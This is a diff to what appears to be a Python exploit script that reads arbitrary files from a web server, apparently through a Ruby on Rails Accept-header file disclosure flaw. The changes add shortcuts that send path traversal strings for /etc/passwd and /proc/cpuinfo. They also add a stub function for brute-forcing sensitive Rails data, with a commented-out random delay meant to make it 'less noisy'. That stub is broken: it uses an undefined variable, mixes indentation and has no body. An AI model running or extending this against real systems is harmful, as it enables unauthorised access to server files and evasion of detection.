@@ -1,5 +1,6 @@
 import sys
-
+import time
+import random
 try:
     import requests
 except ImportError:
@@ -36,6 +37,15 @@ def read_file(url, file):
     req = requests.get(url, headers=headers)
     return req
 
+def brute_force_data(url):
+	# function to brute force sensitive data 
+	# assuming the person did not rename ruby on rails stable directories
+	headers = {'Accept': file + '{{'}
+	above = '../'
+        
+        # time.sleep(random.randint(.5,3))
+        # uncomment this to be less noisy
+
 
 def main():
     banner()
@@ -43,11 +53,15 @@ def main():
     url = sys.argv[1]
     while True:
         try:
-            file = input("Enter file to read (enter quit or q to exit): ")
+            file = input("\033[93m[!] Enter file to read (enter quit or q to exit), enter 1 for /etc/passwd, enter 2 for /proc/cpuinfo enter 3 for seeds.rb: \033[0m")
         except Exception:
-            file = raw_input("Enter file to read (enter quit or q to exit): ")
+            file = raw_input("\033[93m[!] Enter file to read (enter quit or q to exit): \033[0m")
         if file == 'quit' or file == 'q':
                 break
+        if file == '1':
+            file = '../../../../../../../../../etc/passwd'
+        elif file == '2':
+            file = '../../../../../../../../../proc/cpuinfo'
         response = read_file(url, file)
         print(response.text)
 
